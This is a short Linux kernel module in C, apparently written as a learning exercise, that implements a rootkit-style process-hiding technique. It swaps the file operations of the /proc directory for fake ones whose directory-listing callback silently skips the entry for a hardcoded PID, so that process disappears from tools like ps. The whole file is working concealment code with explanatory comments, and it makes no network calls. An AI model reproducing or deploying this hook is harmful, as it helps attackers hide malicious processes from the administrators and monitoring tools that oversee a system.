#include<linux/kernel.h>
#include<linux/module.h>
#include<linux/fs.h> //struct dir_context
#include<linux/namei.h> //kern_path()

struct dir_context *real_ctx;
static int fake_filldir_t(struct dir_context *dir_ctx, const char * pid, int namlen, loff_t pos, u64 inode, unsigned dir_type);
// "hook" the filldir_t actor in fake ctx with fake filldir_t first
// because this field is read-only
struct dir_context fake_ctx = {
    .actor = fake_filldir_t,
};
// these fops are same as the field in struct proc_dir_entry in fs/proc/internal.h. They are used to perform operations when needed.
struct file_operations fake_proc_fops, *real_proc_fops;
struct inode *inode;

#define SECRET_PID "8885" //PID that to be hidden

static int fake_filldir_t(struct dir_context *dir_ctx, const char * pid, int namlen, loff_t pos, u64 inode, unsigned dir_type) {
    if (strncmp(pid, SECRET_PID, strlen(SECRET_PID)) == 0) {
        // the process entry was found, we don't do anything
        // we return 0, pretending everything has been done
        return 0;
    }
    // otherwise, let the genuine filldir_t handle everything
    return real_ctx->actor(real_ctx, pid, namlen, pos, inode, dir_type);
}

int fake_iterate_shared(struct file *fp, struct dir_context *dir_ctx) {
    int ret = 0;
    real_ctx = dir_ctx; //backup the real context
    fake_ctx.pos = dir_ctx->pos;
    //pass the fake_ctx that contains the fake filldir_t to real iterate_shared(), prepare the fake_ctx
    ret = real_proc_fops->iterate_shared(fp, &fake_ctx);
    // change the real position pos with corresponding position the fake process got  
    dir_ctx->pos = fake_ctx.pos;
    return ret;
}

int my_init(void) {
    printk("----------Init hide process2----------\n");

    struct path path;
    kern_path("/proc", LOOKUP_FOLLOW, &path); //fetch the entry to /proc
    fake_proc_fops.iterate_shared = fake_iterate_shared;//here we prepare the fake iterate_shared() func for "/proc" path
    real_proc_fops = path.dentry->d_inode->i_fop; //get the backup fops
    path.dentry->d_inode->i_fop = &fake_proc_fops; //here we hook the real fops with fake one, which contains the fake iterate_shared().
    
    return 0;
}

void my_exit(void) {
    struct path path;
    kern_path("/proc", LOOKUP_FOLLOW, &path);
    //recover
    path.dentry->d_inode->i_fop = real_proc_fops;
    printk("----------Exit hide process2---------\n");
}

MODULE_LICENSE("GPL");
module_init(my_init);
module_exit(my_exit);
